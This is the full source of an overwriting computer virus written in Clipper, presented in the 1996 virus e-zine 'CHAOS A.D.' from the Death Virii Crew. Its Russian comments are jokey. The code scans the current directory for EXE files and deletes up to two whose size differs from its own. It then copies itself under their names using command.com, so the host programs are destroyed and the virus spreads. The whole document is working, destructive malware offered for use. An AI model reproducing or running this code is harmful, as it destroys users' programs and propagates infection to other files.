// [Death Virii Crew] Presents
// CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997

// Вирий написаный на Clipper 5.01r
MyName:='Misery'                         // Моё настоящее имя
Counter:=0                               // Счетчик зараженных файлов
Declare aFiles[ADIR("*.exe")]            // А сколько у нас Ехе-шничков
Declare aSizes[ADIR("*.exe")]            // в каталоге ?
adir("*.exe",aFiles,aSizes)              // Имена и размеры возьмем
Iamis:=procname()+".EXE"                 // А как меня сейчас зовут ???
mysize:=aSizes[ascan(aFiles,Iamis)]      // А какой у меня объем бедер ???
aeval(aFiles,{|element| verif(element)}) // Раз, два, три, четыре, пять !
                                         // Я иду заражать !
                                         // Кто не спрятался - я не виноват !
quit                                     // Жаль... Пришла пора прощаться...
// Функца проверки продуктов жизнедеятельности будущего преемника
function verif(fname)
if (Fname!=Iamis).and.(aSizes[ascan(aFiles,Fname)]!=MySize).and.(Counter<2)
   // Уррррааа ! Нашли себе нового потомка !
   infected(fname)      // Заменим его
   Counter:=Counter+1   // Счетчик +
endif
return NIL
//
function infected(FuckFile)
   if FErase(FuckFile)!=0
      return NIL      // А блин... Не удаляется... Ну и хрен с ним !
   endif
   run ("command.com /c copy "+Iamis+" "+FuckFile+" >NUL")
return NIL
